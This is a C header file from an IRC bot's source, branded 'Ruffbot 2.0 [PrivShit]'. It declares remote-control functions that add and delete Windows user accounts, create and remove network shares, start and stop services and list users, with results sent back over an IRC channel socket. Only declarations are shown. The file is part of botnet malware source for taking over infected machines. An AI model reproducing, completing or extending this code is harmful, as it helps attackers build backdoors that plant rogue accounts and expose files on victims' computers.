/*
XXXXXXXXXXXXXX   XXXXX      XXXXX  XXXXXXXXXXXXX   XXXXXXXXXXXXX  
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXXXXX  XXXXXXXXXXXXXX 
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXXXX   XXXXXXXXXXXXX  
XXXX       XXXX  XXXXX      XXXXX  XXXXX           XXXXX            
XXXX       XXXX  XXXXX      XXXXX  XXXXX           XXXXX            
XXXXXXXXXXXXXXX  XXXXX      XXXXX  XXXXXXXXXXX     XXXXXXXXXXX     
XXXXXXXXXXXXXX   XXXXX      XXXXX  XXXXXXXXXXXX    XXXXXXXXXXXX     
XXXXXXXXX        XXXXX      XXXXX  XXXXXXXXXXX     XXXXXXXXXXX    
XXXX XXXXX       XXXXX      XXXXX  XXXXX           XXXXX           
XXXX  XXXXX      XXXXX      XXXXX  XXXXX           XXXXX           
XXXX   XXXXX     XXXXX      XXXXX  XXXXX           XXXXX           
XXXX    XXXXX    XXXXXX    XXXXXX  XXXXX           XXXXX           
XXXX     XXXXX   XXXXXXXXXXXXXXXX  XXXXX           XXXXX           
XXXX      XXXXX   XXXXXXXXXXXXXX   XXXXX           XXXXX           
XXXX       XXXXX   XXXXXXXXXXXX    XXXXX           XXXXX 
     



        Ruffbot 2.0 [PrivShit] by Ruffnes

*/ 


#ifndef NO_NET
enum {NET_ADD, NET_DELETE, NET_INFO, NET_START, NET_STOP, NET_PAUSE, NET_CONTINUE};

#define IsVSD(x) ((x)?("Yes"):("No"))

typedef struct NetCommand
{
	char *action;
	char *completed;
	DWORD control;
	
} NetCommand;

char *Services(int action, char *ServiceName);
DWORD ServiceControl(int option, char *ServiceName, DWORD dwControl=0, DWORD nArg=0, LPCTSTR *pArg=NULL); 
static char *ServiceError(DWORD svcError);
BOOL ListServices(SOCKET sock, char *chan, BOOL notice);
char *Shares(int action, char *ShareName, char *SharePath=NULL);
static char *AsWideString(const char *cszANSIstring);
char *AsAnsiString(const WCHAR *cszWIDEstring);
NET_API_STATUS ShareAdd(char *ServerName, char *ShareName, char *SharePath);
NET_API_STATUS ShareDel(char *ServerName, char *ShareName);
BOOL ListShares(SOCKET sock, char *chan, BOOL notice, char *ServerName=NULL);
char *Users(int action, char *Username, char *Password, SOCKET sock, char *chan, BOOL notice);
NET_API_STATUS UserAdd(char *ServerName, char *Username, char *Password);
NET_API_STATUS UserDel(char *ServerName, char *Username);
NET_API_STATUS UserInfo(char *ServerName, char *Username, SOCKET sock, char *chan, BOOL notice);
BOOL ListUsers(SOCKET sock, char *chan, BOOL noice, char *ServerName=NULL);
static char *NasError(NET_API_STATUS nStatus);
char *NetSend(char *msg, SOCKET sock, char *chan, BOOL notice);
#endif
